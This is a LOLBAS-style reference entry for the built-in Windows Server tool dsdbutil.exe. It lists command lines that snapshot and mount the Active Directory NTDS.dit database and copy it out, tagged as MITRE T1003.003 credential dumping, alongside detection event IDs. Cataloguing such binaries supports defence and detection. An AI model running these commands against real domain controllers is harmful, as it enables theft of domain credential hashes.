---
Acknowledgement:
- Handle: '@bohops'
  Person: bohop
- Person: Eki
Aliases:
- Alias: dsDbUtil.exe
Author: Ekitji
Commands:
- Category: Dump
  Command: dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
  Description: dsdbutil supports VSS snapshot creation
  MitreID: T1003.003
  OperatingSystem: Windows Server 2012, Windows Server 2016, Windows Server 2019
  Privileges: Administrator
  Usecase: Snapshoting of Active Directory NTDS.dit database
- Category: Dump
  Command: dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit"
    "quit"
  Description: Mounting the snapshot with its GUID
  MitreID: T1003.003
  OperatingSystem: Windows Server 2012, Windows Server 2016, Windows Server 2019
  Privileges: Administrator
  Usecase: Mounting the snapshot to access the ntds.dit with `copy c:\<Snap Volume>\windows\ntds\ntds.dit
    c:\users\administrator\desktop\ntds.dit.bak`
- Category: Dump
  Command: dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit"
    "quit"
  Description: Deletes the mount of the snapshot
  MitreID: T1003.003
  OperatingSystem: Windows Server 2012, Windows Server 2016, Windows Server 2019
  Privileges: Administrator
  Usecase: Deletes the snapshot
- Category: Dump
  Command: dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount
    1" "quit" "quit"
  Description: Mounting with snapshot identifier
  MitreID: T1003.003
  OperatingSystem: Windows Server 2012, Windows Server 2016, Windows Server 2019
  Privileges: Administrator
  Usecase: Mounting the snapshot identifier 1 and accessing it with `copy c:\<Snap
    Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`
- Category: Dump
  Command: dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1"
    "quit" "quit"
  Description: Deletes the mount of the snapshot
  MitreID: T1003.003
  OperatingSystem: Windows Server 2012, Windows Server 2016, Windows Server 2019
  Privileges: Administrator
  Usecase: deletes the snapshot
Created: 2023-05-31
Description: Dsdbutil is a command-line tool that is built into Windows Server. It
  is available if you have the AD LDS server role installed. Can be used as a command
  line utility to export Active Directory.
Detection:
- IOC: Event ID 4688
- IOC: dsdbutil.exe process creation
- IOC: Event ID 4663
- IOC: Regular and Volume Shadow Copy attempts to read or modify ntds.dit
- IOC: Event ID 4656
- IOC: Regular and Volume Shadow Copy attempts to read or modify ntds.dit
Full_Path:
- Path: C:\Windows\System32\dsdbutil.exe
- Path: C:\Windows\SysWOW64\dsdbutil.exe
Name: dsdbutil.exe
Resources:
- Link: https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358
- Link: https://www.netwrix.com/ntds_dit_security_active_directory.html
mitre_data:
  technique_ids:
  - T1003.003
tags:
- lolbas/othermsbinaries
---

# dsdbutil.exe

Dsdbutil is a command-line tool that is built into Windows Server. It is available if you have the AD LDS server role installed. Can be used as a command line utility to export Active Directory.

# Path(s)

- `C:\Windows\System32\dsdbutil.exe`
- `C:\Windows\SysWOW64\dsdbutil.exe`

# Dump Commands

dsdbutil supports VSS snapshot creation

```batch
dsdbutil.exe "activate instance ntds" "snapshot" "create" "quit" "quit"
```

- **Usecase:** Snapshoting of Active Directory NTDS.dit database
- **Privileges Required:** Administrator
- **MitreID:** `T1003.003`
- **Operating System(s):** Windows Server 2012, Windows Server 2016, Windows Server 2019



Mounting the snapshot with its GUID

```batch
dsdbutil.exe "activate instance ntds" "snapshot" "mount {GUID}" "quit" "quit"
```

- **Usecase:** Mounting the snapshot to access the ntds.dit with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`
- **Privileges Required:** Administrator
- **MitreID:** `T1003.003`
- **Operating System(s):** Windows Server 2012, Windows Server 2016, Windows Server 2019



Deletes the mount of the snapshot

```batch
dsdbutil.exe "activate instance ntds" "snapshot" "delete {GUID}" "quit" "quit"
```

- **Usecase:** Deletes the snapshot
- **Privileges Required:** Administrator
- **MitreID:** `T1003.003`
- **Operating System(s):** Windows Server 2012, Windows Server 2016, Windows Server 2019



Mounting with snapshot identifier

```batch
dsdbutil.exe "activate instance ntds" "snapshot" "create" "list all" "mount 1" "quit" "quit"
```

- **Usecase:** Mounting the snapshot identifier 1 and accessing it with `copy c:\<Snap Volume>\windows\ntds\ntds.dit c:\users\administrator\desktop\ntds.dit.bak`
- **Privileges Required:** Administrator
- **MitreID:** `T1003.003`
- **Operating System(s):** Windows Server 2012, Windows Server 2016, Windows Server 2019



Deletes the mount of the snapshot

```batch
dsdbutil.exe "activate instance ntds" "snapshot" "list all" "delete 1" "quit" "quit"
```

- **Usecase:** deletes the snapshot
- **Privileges Required:** Administrator
- **MitreID:** `T1003.003`
- **Operating System(s):** Windows Server 2012, Windows Server 2016, Windows Server 2019



# Resource(s)

- https://gist.github.com/bohops/88561ca40998e83deb3d1da90289e358
- https://www.netwrix.com/ntds_dit_security_active_directory.html
# Acknowledgements

- Ekitji (Authored, 2023-05-31)
- bohop (@bohops)
- Eki